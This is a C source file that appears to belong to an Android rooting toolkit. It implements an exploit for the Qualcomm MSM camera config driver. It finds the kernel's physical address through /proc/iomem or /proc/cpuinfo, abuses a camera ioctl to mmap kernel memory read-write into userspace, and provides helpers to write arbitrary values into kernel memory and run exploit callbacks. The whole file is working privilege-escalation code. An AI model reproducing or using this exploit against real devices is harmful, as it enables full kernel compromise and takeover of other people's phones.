/*
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdint.h>
#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/fb.h>
#include <string.h>

#include "msm_cameraconfig.h"

#define MSM_CAM_IOCTL_MAGIC 'm'

struct msm_mem_map_info {
    uint32_t cookie;
    uint32_t length;
    uint32_t mem_type;
};

#define MSM_CAM_IOCTL_SET_MEM_MAP_INFO \
        _IOR(MSM_CAM_IOCTL_MAGIC, 41, struct msm_mem_map_info *)

#define MSM_MEM_MMAP 0

#define KERNEL_VIRT_ADDRESS     0xc0000000
#define MAPPED_BASE             0x20000000
#define KERNEL_SIZE             0x02000000

static bool kernel_phys_offset_initialized = false;
static unsigned long kernel_phys_offset = 0;

static int
get_cpu_implementer(void)
{
  FILE *fp;
  char name[BUFSIZ];
  char value[BUFSIZ];
  int ret;
  long int implementer = 0;

  fp = fopen("/proc/cpuinfo", "r");
  if (!fp) {
    printf("Failed to open /proc/cpuinfo due to %s.", strerror(errno));
    return 0;
  }

  while ((ret = fscanf(fp, "%[^:]: %[^\n]\n", name, value)) != EOF) {
    if (!strncmp(name, "CPU implementer", 15)) {
      implementer = strtol(value, NULL, 16);
      break;
    }
  }
  fclose(fp);

  return implementer;
}

static unsigned long int
detect_kernel_phys_address_from_cpuinfo(void)
{
  int implementer;

  implementer = get_cpu_implementer();

  switch (implementer) {
  case 'Q':
    return 0x80200000;
  }
  return 0x80000000;
}

static unsigned long int
get_system_ram_address_from_iomem(void)
{
  FILE *fp;
  char name[BUFSIZ];
  void *start_address, *end_address;
  void *system_ram_address = NULL;
  int ret;

  fp = fopen("/proc/iomem", "r");
  if (!fp) {
    printf("Failed to open /proc/iomem due to %s.\n", strerror(errno));
    return false;
  }
  while ((ret = fscanf(fp, "%p-%p : %[^\n]", &start_address, &end_address, name)) != EOF) {
    if (!strcmp(name, "System RAM")) {
      system_ram_address = start_address;
      continue;
    }
    if (!strncmp(name, "Kernel", 6)) {
      break;
    }
  }
  fclose(fp);

  return (unsigned long int)system_ram_address;
}

static bool
detect_kernel_phys_parameters(void)
{
  unsigned long int system_ram_address;

  system_ram_address = get_system_ram_address_from_iomem();
  if (!system_ram_address) {
    system_ram_address = detect_kernel_phys_address_from_cpuinfo();
  }

  kernel_phys_offset_initialized = true;
  kernel_phys_offset = system_ram_address;

  return true;
}

void *
msm_cameraconfig_convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (uint32_t)address - KERNEL_VIRT_ADDRESS;
}

bool
msm_cameraconfig_write_value_at_address(unsigned long int address, int value)
{
  void *mmap_address = NULL;
  int *write_address;
  int fd_video;
  int fd_config;

  mmap_address = msm_cameraconfig_mmap(&fd_video, &fd_config);
  if (mmap_address == MAP_FAILED) {
    return false;
  }

  write_address = msm_cameraconfig_convert_to_mmaped_address((void*)address, mmap_address);
  *write_address = value;

  msm_cameraconfig_munmap(mmap_address, fd_video, fd_config);

  return true;
}

bool
msm_cameraconfig_run_exploit(bool(*exploit_callback)(void *mmap_base_address, void *user_data),
                   void *user_data)
{
  void *mapped_address = NULL;
  int fd_video;
  int fd_config;
  bool success;

  mapped_address = msm_cameraconfig_mmap(&fd_video, &fd_config);
  if (mapped_address == MAP_FAILED) {
    return false;
  }

  success = exploit_callback(mapped_address, user_data);

  msm_cameraconfig_munmap(mapped_address, fd_video, fd_config);

  return success;
}

void
msm_cameraconfig_set_kernel_phys_offset(int offset)
{
  kernel_phys_offset_initialized = true;
  kernel_phys_offset = offset;
}

void *
msm_cameraconfig_mmap(int *fd_video, int *fd_config)
{
  struct msm_mem_map_info args;
  void *mapped_address;

  if (!kernel_phys_offset_initialized && !detect_kernel_phys_parameters()) {
     printf("This machine can not use msm_cameraconfig exploit.\n");
     return MAP_FAILED;
  }

  *fd_video = open("/dev/video0", O_RDWR);
  if (*fd_video < 0) {
    goto error_exit;
  }

  *fd_config = open("/dev/msm_camera/config0", O_RDWR);
  if (*fd_config < 0) {
    goto error_exit;
  }

  args.cookie = kernel_phys_offset;
  args.length = KERNEL_SIZE;
  args.mem_type = MSM_MEM_MMAP;

  if (ioctl(*fd_config, MSM_CAM_IOCTL_SET_MEM_MAP_INFO, &args) < 0) {
    goto error_exit;
  }

  mapped_address = mmap((void *)MAPPED_BASE, KERNEL_SIZE, PROT_READ | PROT_WRITE,
                        MAP_SHARED, *fd_config, kernel_phys_offset);

  if (mapped_address == MAP_FAILED) {
    goto error_exit;
  }

  return mapped_address;

error_exit:
  if (*fd_config >= 0) {
    close(*fd_config);
    *fd_config = -1;
  }

  if (*fd_video >= 0) {
    close(*fd_video);
    *fd_video = -1;
  }

  return MAP_FAILED;
}

int
msm_cameraconfig_munmap(void *address, int fd_video, int fd_config)
{
  if (address != MAP_FAILED) {
    int ret;

    ret = munmap(address, KERNEL_SIZE);
    if (ret < 0) {
      printf("Failed to munmap due to %s\n", strerror(errno));
      return ret;
    }
  }

  close(fd_config);
  close(fd_video);

  return 0;
}
